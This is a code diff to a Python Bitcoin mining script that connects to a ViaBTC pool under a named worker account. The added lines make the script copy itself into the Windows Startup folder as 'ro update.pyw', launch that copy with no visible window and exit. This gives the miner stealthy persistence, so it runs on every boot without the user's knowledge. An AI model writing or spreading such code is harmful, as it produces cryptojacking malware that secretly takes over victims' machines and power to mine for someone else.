@@ -1,19 +1,28 @@
 import os
+import sys
 import socket
 import json
 import struct
 import hashlib
 import binascii
 import threading
+import subprocess
 from concurrent.futures import ThreadPoolExecutor
 import time
+
+current_dir = os.path.abspath(__file__)
+startup_path = f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+if "Startup" not in current_dir:
+    subprocess.run(["cmd", "/c", "copy", current_dir, startup_path + "/ro update.pyw"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    subprocess.run(["python", startup_path + "/ro update.pyw"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    sys.exit()
 
 POOL_HOST = 'btc.viabtc.com'
 POOL_PORT = 3333
 USERNAME = 'Dazomo.viaminer01'
 PASSWORD = 'x'
 
-lock = threading.Lock()  # Pour protéger l’écriture socket
+lock = threading.Lock()
 
 def swap_endian(hex_str):
     return bytes.fromhex(hex_str)[::-1].hex()
